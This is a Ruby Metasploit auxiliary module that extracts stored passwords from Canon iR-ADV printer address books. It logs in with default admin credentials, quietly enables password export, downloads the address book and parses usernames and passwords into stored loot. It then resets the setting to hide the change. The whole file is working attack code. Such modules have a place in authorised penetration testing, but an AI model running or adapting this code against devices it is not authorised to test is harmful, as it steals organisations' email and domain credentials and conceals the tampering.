#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Canon IR-Adv Password Extractor',
      'Description'    => %q{
        This module will extract the passwords from address books on various Canon IR-Adv mfp devices.
        Tested models:
        iR-ADV C2030,
        iR-ADV 4045,
        iR-ADV C5030,
        iR-ADV C5235,
        iR-ADV C5240,
        iR-ADV 6055,
        iR-ADV C7065
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('ADDRSBOOK', [ true, 'The number of the address book to extract 1-11', 1]),
        OptInt.new('RPORT', [ true, 'The target port', 8000]),
        OptString.new('USER', [ true, 'The default Admin user', '7654321']),
        OptString.new('PASSWD', [ true, 'The default Admin password', '7654321']),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end

# Time to start the fun
  def run_host(ip)
    print_status("Attempting to extract passwords from the address books on the MFP at #{rhost}")
    login(ip)
  end

#Authenticate to management function on Canon MFP and build needed cookies for dta harvesting
  def login(ip)
    login_post_data = "uri=%2f&deptid=#{datastore['USER']}&password=#{datastore['PASSWD']}"

    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/login',
        'data'    => login_post_data,
      }, datastore['TIMEOUT'].to_i)
    end

    #grab Canon sessionid cookie
    idcookie = res.get_cookies

    if (res.code == 301 or res.code == 302 and res.headers['Location'] != nil)
      print_good("#{rhost} - SUCCESSFUL login with USER='#{datastore['USER']}' : PASSWORD='#{datastore['PASSWD']}'")

    #grab Canon IR= session cookie
      begin
        res = send_request_cgi({
          'method'  => 'GET',
          'uri'     => '/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064',
          'headers' => {'Cookie' => "#{idcookie}"},
          }, datastore['TIMEOUT'].to_i)
      end
      ircookie = res.get_cookies
      cookies=("#{idcookie}; #{ircookie}")

      set_allow(cookies)
      extract(cookies, ip)
      set_disallow(cookies)

    else
      print_error("Failed to login on #{rhost}. Please check the password for the #{datastore['USER']} account ")
    end
  end


# Set the allow password export to on
  def set_allow(cookies)
  set_post_data = "ADRSEXPPSWDCHK=0&PageFlag=c_adrs.tpl&Flag=Exec_Data&CoreNXAction=./cadrs.cgi&CoreNXPage=c_adrexppass.tpl&CoreNXFlag=Init_Data&Dummy=1359048058115"

    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/rps/cadrs.cgi',
        'data'    => set_post_data,
        'headers' => {'Cookie' => "#{cookies}"},
      }, datastore['TIMEOUT'].to_i)
    end
  end

# Extract the adress book data and save out to loot
  def extract(cookies, ip)
    extract_data ="AID=#{datastore['ADDRSBOOK']}&ACLS=1&ENC_MODE=0&ENC_FILE=password&PASSWD=&PageFlag=&AMOD=&Dummy=1359047882596&ERR_PG_KIND_FLG=Adress_Export"
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/rps/abook.ldif',
        'data'    => extract_data,
        'headers' => {'Cookie' => "#{cookies}"},
      }, datastore['TIMEOUT'].to_i)
    end
    address_book = (res.body)
    print_status("#{address_book}")

    #Woot we got loot.
    loot_name     = "canon.iradv.addressbook"
    loot_type     = "text/plain"
    loot_filename = "Canon-addressbook.text"
    loot_desc     = "Canon Addressbook Harvester"
    p = store_loot(loot_name, loot_type, datastore['RHOST'], address_book , loot_filename, loot_desc)
    print_status("Credentials saved in: #{p.to_s}")

    harvest_ldif(address_book, ip)
  end

# Reset the allow password export to off
  def set_disallow(cookies)
    set_post_data = "ADRSEXPPSWDCHK=1&PageFlag=c_adrs.tpl&Flag=Exec_Data&CoreNXAction=./cadrs.cgi&CoreNXPage=c_adrexppass.tpl&CoreNXFlag=Init_Data&Dummy=1359048058115"

    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/rps/cadrs.cgi',
        'data'    => set_post_data,
        'headers' => {'Cookie' => "#{cookies}"},
      }, datastore['TIMEOUT'].to_i)
    end
  end

  # Harvest Credential
  def harvest_ldif(address_book, ip)
    harvest_file(address_book, ip)
  end

  def harvest_credentials(mailaddress, pwd, ip)
    return 0 if mailaddress == nil
    username_domain = mailaddress.split('@')
    username = username_domain[0]
    domain = username_domain[1]

    service_data = {
        address: Rex::Socket.getaddress(ip),
        port: rport,
        protocol: 'tcp',
        service_name: 'http',
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        username: username,
        private_data: pwd,
        private_type: :password
    }

    create_credential(credential_data.merge(service_data))

    puts "Domain: #{domain}\nUser: #{username}\nPassword: #{pwd}\n\r"
  end

  def harvest_file(ldif, ip)
    users = []
    ldif.split("\r\n\r\n").each do |user|
      user_attributes = {}
      user.split("\r\n").each do |attribute|
        attribute_array = attribute.split(": ")
        attr_name = attribute_array.shift
        attr_value = attribute_array.join
        user_attributes[attr_name] = attr_value
      end
      harvest_credentials((user_attributes['username'] || user_attributes['mailaddress'] || user_attributes['mail']), user_attributes['pwd'], ip)
      users << user_attributes
    end
  end

end
